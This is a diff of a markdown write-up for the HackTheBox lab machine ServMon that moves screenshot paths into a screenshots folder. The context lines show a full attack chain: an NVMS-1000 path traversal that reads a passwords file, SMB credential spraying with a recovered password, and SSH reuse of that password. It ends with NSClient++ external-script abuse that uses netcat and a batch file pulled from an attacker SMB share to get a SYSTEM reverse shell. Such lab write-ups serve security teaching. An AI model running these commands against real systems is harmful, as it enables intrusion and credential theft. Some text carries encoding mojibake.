@@ -47,7 +47,7 @@ We send a single ICMP echo request to confirm the target is reachable:
 ping -c 1 10.10.10.184
 ```
 
-![ping result](ServMon_01_ping.png)
+![ping result](screenshots/ServMon_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -67,7 +67,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.184 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![nmap all TCP ports](ServMon_02_nmap_allports.png)
+![nmap all TCP ports](screenshots/ServMon_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -75,7 +75,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractPorts open port list](ServMon_03_extractports.png)
+![extractPorts open port list](screenshots/ServMon_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -96,8 +96,8 @@ nmap -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49
 cat targeted
 ```
 
-![nmap targeted services (FTP, SSH, HTTP, SMB, NSClient++)](ServMon_04_nmap_targeted_services.png)
-![nmap RPC ports, fingerprints, SMB scripts, OS Windows](ServMon_05_nmap_targeted_rpc_fingerprints_smb.png)
+![nmap targeted services (FTP, SSH, HTTP, SMB, NSClient++)](screenshots/ServMon_04_nmap_targeted_services.png)
+![nmap RPC ports, fingerprints, SMB scripts, OS Windows](screenshots/ServMon_05_nmap_targeted_rpc_fingerprints_smb.png)
 
 **Findings:**
 
@@ -124,17 +124,17 @@ ftp 10.10.10.184
 
 Use username `anonymous` with a blank or email-style password when prompted.
 
-![anonymous FTP listing Users/Nadine/Nathan](ServMon_06_ftp_anonymous_listing.png)
+![anonymous FTP listing Users/Nadine/Nathan](screenshots/ServMon_06_ftp_anonymous_listing.png)
 
 Two home directories appear: **Nadine** (file `Confidential.txt`) and **Nathan** (file `Notes_to_do.txt`). Pull both files locally and read them.
 
 **Confidential.txt** states that **Passwords.txt** was left on Nathanâ€™s desktop:
 
-![Confidential.txt](ServMon_07_cat_confidential_txt.png)
+![Confidential.txt](screenshots/ServMon_07_cat_confidential_txt.png)
 
 **Notes_to_do.txt** includes a reminder to review **NVMS-1000** (monitoring software), pointing toward the web service on port **80**:
 
-![Notes to do.txt](ServMon_08_cat_notes_to_do_txt.png)
+![Notes to do.txt](screenshots/ServMon_08_cat_notes_to_do_txt.png)
 
 ---
 ### 2.2 NVMS-1000 Web Application
@@ -145,7 +145,7 @@ Browse to **`http://10.10.10.184`** in a browser to reach the **NVMS-1000** moni
 Open http://10.10.10.184 in the browser (NVMS-1000).
 ```
 
-![NVMS-1000 web login](ServMon_10_nvms1000_web_login.png)
+![NVMS-1000 web login](screenshots/ServMon_10_nvms1000_web_login.png)
 
 ---
 ## 3. Foothold
@@ -158,7 +158,7 @@ Open http://10.10.10.184 in the browser (NVMS-1000).
 searchsploit NVMS
 ```
 
-![searchsploit NVMS directory traversal](ServMon_09_searchsploit_nvms_traversal.png)
+![searchsploit NVMS directory traversal](screenshots/ServMon_09_searchsploit_nvms_traversal.png)
 
 Inspect the published text for exact request patterns:
 
@@ -166,7 +166,7 @@ Inspect the published text for exact request patterns:
 searchsploit -x hardware/webapps/47774.txt
 ```
 
-![exploit-db 47774 PoC](ServMon_11_exploitdb_47774_directory_traversal_poc.png)
+![exploit-db 47774 PoC](screenshots/ServMon_11_exploitdb_47774_directory_traversal_poc.png)
 
 ---
 ### 3.2 Path Traversal via HTTP (Burp Suite)
@@ -179,23 +179,23 @@ Burp Suite: enable Proxy listener; point the browser at http://10.10.10.184 thro
 
 Capture a baseline **`GET /Pages/login.htm`** request in **Repeater** (or send from **Proxy** after intercept):
 
-![Burp Repeater login.htm request](ServMon_12_burp_repeater_login_htm.png)
+![Burp Repeater login.htm request](screenshots/ServMon_12_burp_repeater_login_htm.png)
 
 Modify the path to walk up the directory tree and read a known Windows fileâ€”**`win.ini`** confirms the traversal works:
 
-![Burp Repeater traversal win.ini](ServMon_13_burp_repeater_traversal_win_ini.png)
+![Burp Repeater traversal win.ini](screenshots/ServMon_13_burp_repeater_traversal_win_ini.png)
 
 Repeat with a traversal targeting the Windows **`hosts`** file under **`System32\Drivers\etc`**:
 
-![Burp Repeater traversal hosts](ServMon_14_burp_repeater_traversal_hosts.png)
+![Burp Repeater traversal hosts](screenshots/ServMon_14_burp_repeater_traversal_hosts.png)
 
 Then point the traversal at **Nathanâ€™s** desktop file **`Passwords.txt`** and recover its contents in the response body:
 
-![Burp Repeater traversal Passwords.txt](ServMon_15_burp_repeater_traversal_passwords_txt.png)
+![Burp Repeater traversal Passwords.txt](screenshots/ServMon_15_burp_repeater_traversal_passwords_txt.png)
 
 Split the recovered lines into **`users.txt`** and **`passwords.txt`** for spraying (one username and one password per line, aligned by row as in the recovered file):
 
-![cat users and passwords files](ServMon_16_cat_users_passwords_files.png)
+![cat users and passwords files](screenshots/ServMon_16_cat_users_passwords_files.png)
 
 ---
 ### 3.3 SMB Credential Testing and SSH Access
@@ -206,11 +206,11 @@ Spray the paired lists against **SMB** to find any valid account (continue on su
 crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt --continue-on-success
 ```
 
-![crackmapexec SMB spray with user/password lists](ServMon_17_crackmapexec_smb_spray.png)
+![crackmapexec SMB spray with user/password lists](screenshots/ServMon_17_crackmapexec_smb_spray.png)
 
 A valid line appears for **Nadine**; save the password for reuse (example: a local **`credentials`** file):
 
-![cat credentials Nadine](ServMon_18_cat_credentials_nadine.png)
+![cat credentials Nadine](screenshots/ServMon_18_cat_credentials_nadine.png)
 
 Verify the pair explicitly:
 
@@ -218,7 +218,7 @@ Verify the pair explicitly:
 crackmapexec smb 10.10.10.184 -u 'Nadine' -p 'L1k3B1gBut7s@W0rk'
 ```
 
-![crackmapexec SMB verify Nadine](ServMon_19_crackmapexec_smb_verify.png)
+![crackmapexec SMB verify Nadine](screenshots/ServMon_19_crackmapexec_smb_verify.png)
 
 SMB reports valid credentials but not **Pwn3d**, so **WinRM**-style remote shells are not the immediate path. **SSH** on port **22** is available, so reuse the same password there:
 
@@ -228,7 +228,7 @@ sshpass -p 'L1k3B1gBut7s@W0rk' ssh Nadine@10.10.10.184
 
 After the SSH session lands in a Windows shell, confirm the user context and read **`user.txt`**:
 
-![cmd.exe whoami and user.txt](ServMon_20_cmd_user_txt.png)
+![cmd.exe whoami and user.txt](screenshots/ServMon_20_cmd_user_txt.png)
 
 ðŸ **User flag obtained**
 
@@ -239,11 +239,11 @@ After the SSH session lands in a Windows shell, confirm the user context and rea
 
 On the host, **Nadine** has no obvious admin paths or privileged group memberships in the quick review from the notes:
 
-![nadine net user and privileges](ServMon_21_nadine_enum_net_user.png)
+![nadine net user and privileges](screenshots/ServMon_21_nadine_enum_net_user.png)
 
 Revisit the service map: **8443/tcp** serves an **NSClient++** HTTPS console and prompts for a password without requiring a Windows username in the browser:
 
-![NSClient++ web login :8443](ServMon_22_nsclient_web_login_8443.png)
+![NSClient++ web login :8443](screenshots/ServMon_22_nsclient_web_login_8443.png)
 
 **SearchSploit** also lists a **local privilege escalation** path involving **NSClient++**, which matches our interactive shell as **Nadine**:
 
@@ -251,11 +251,11 @@ Revisit the service map: **8443/tcp** serves an **NSClient++** HTTPS console and
 searchsploit NSClient++
 ```
 
-![searchsploit NSClient++](ServMon_23_searchsploit_nsclient.png)
+![searchsploit NSClient++](screenshots/ServMon_23_searchsploit_nsclient.png)
 
 Read the referenced advisory (**46802**) for the local **`nscp`** password recovery and **external script** abuse outline:
 
-![exploit-db 46802 NSClient++ privesc](ServMon_24_exploitdb_46802_nsclient_privesc_txt.png)
+![exploit-db 46802 NSClient++ privesc](screenshots/ServMon_24_exploitdb_46802_nsclient_privesc_txt.png)
 
 ---
 ### 4.2 Recovering the NSClient++ Web Password
@@ -267,11 +267,11 @@ cd "C:\Program Files\NSClient++"
 nscp web --password --display
 ```
 
-![nscp web password display](ServMon_25_nscp_web_password_display.png)
+![nscp web password display](screenshots/ServMon_25_nscp_web_password_display.png)
 
 Direct browser access to **`https://10.10.10.184:8443`** from the attacker machine returns **403** even with the correct passwordâ€”access is effectively treated as non-local:
 
-![NSClient++ login 403 forbidden](ServMon_26_nsclient_login_403_forbidden.png)
+![NSClient++ login 403 forbidden](screenshots/ServMon_26_nsclient_login_403_forbidden.png)
 
 ---
 ### 4.3 SSH Local Port Forwarding
@@ -284,11 +284,11 @@ sshpass -p 'L1k3B1gBut7s@W0rk' ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
 
 After signing in, the **Home** dashboard loads over **`localhost`** (expected once the forward is up):
 
-![NSClient++ localhost Home metrics](ServMon_27_nsclient_localhost_home_metrics.png)
+![NSClient++ localhost Home metrics](screenshots/ServMon_27_nsclient_localhost_home_metrics.png)
 
 Confirm required modules (**CheckExternalScripts**, **Scheduler**) are enabled under **Modules** as described in the exploit write-up:
 
-![NSClient++ modules enabled](ServMon_28_nsclient_modules_enabled.png)
+![NSClient++ modules enabled](screenshots/ServMon_28_nsclient_modules_enabled.png)
 
 ---
 ### 4.4 Preparing Payloads and Transfer
@@ -300,7 +300,7 @@ unzip netcat-win32-1.12.zip
 cat evil.bat
 ```
 
-![netcat zip and evil.bat staging](ServMon_29_netcat_evil_bat_staging.png)
+![netcat zip and evil.bat staging](screenshots/ServMon_29_netcat_evil_bat_staging.png)
 
 Serve the folder with **Impacket**â€™s **`smbserver`**. A straight anonymous guest pull from the target can fail under **guest logon** hardening:
 
@@ -308,7 +308,7 @@ Serve the folder with **Impacket**â€™s **`smbserver`**. A straight anonymou
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
 
-![SMB guest blocked and impacket smbserver](ServMon_30_smb_guest_blocked_impacket_smbserver.png)
+![SMB guest blocked and impacket smbserver](screenshots/ServMon_30_smb_guest_blocked_impacket_smbserver.png)
 
 Recreate the share with credentials and mount it from the victim (example user **`kali`** / password **`kali123`**):
 
@@ -320,11 +320,11 @@ impacket-smbserver smbFolder $(pwd) -smb2support -username kali -password kali12
 net use x: \\10.10.14.22\smbFolder /user:kali kali123
 ```
 
-![SMB authenticated mount and share listing](ServMon_31_smb_authenticated_mount_impacket.png)
+![SMB authenticated mount and share listing](screenshots/ServMon_31_smb_authenticated_mount_impacket.png)
 
 Copy **`evil.bat`** and **`nc64.exe`** (as **`nc.exe`**) into **`C:\Temp`** on the target:
 
-![copy payloads into C:\Temp](ServMon_32_copy_payloads_c_temp.png)
+![copy payloads into C:\Temp](screenshots/ServMon_32_copy_payloads_c_temp.png)
 
 ---
 ### 4.5 External Script Execution
@@ -337,11 +337,11 @@ nc -nlvp 443
 
 In **NSClient++** (**Settings â†’ External Scripts â†’ Scripts**), add a script mapping (this run uses key **`reverse`** pointing at **`c:\temp\evil.bat`**), then **Changes â†’ Save configuration** and **Control â†’ Reload**:
 
-![NSClient++ external script reverse](ServMon_33_nsclient_external_script_reverse.png)
+![NSClient++ external script reverse](screenshots/ServMon_33_nsclient_external_script_reverse.png)
 
 When the job fires, the listener receives a shell as **`NT AUTHORITY\SYSTEM`**; collect **`root.txt`** from the Administrator profile:
 
-![nc listener SYSTEM shell and root.txt](ServMon_34_nc_listener_system_shell_root_txt.png)
+![nc listener SYSTEM shell and root.txt](screenshots/ServMon_34_nc_listener_system_shell_root_txt.png)
 
 ðŸ **Root flag obtained**
 
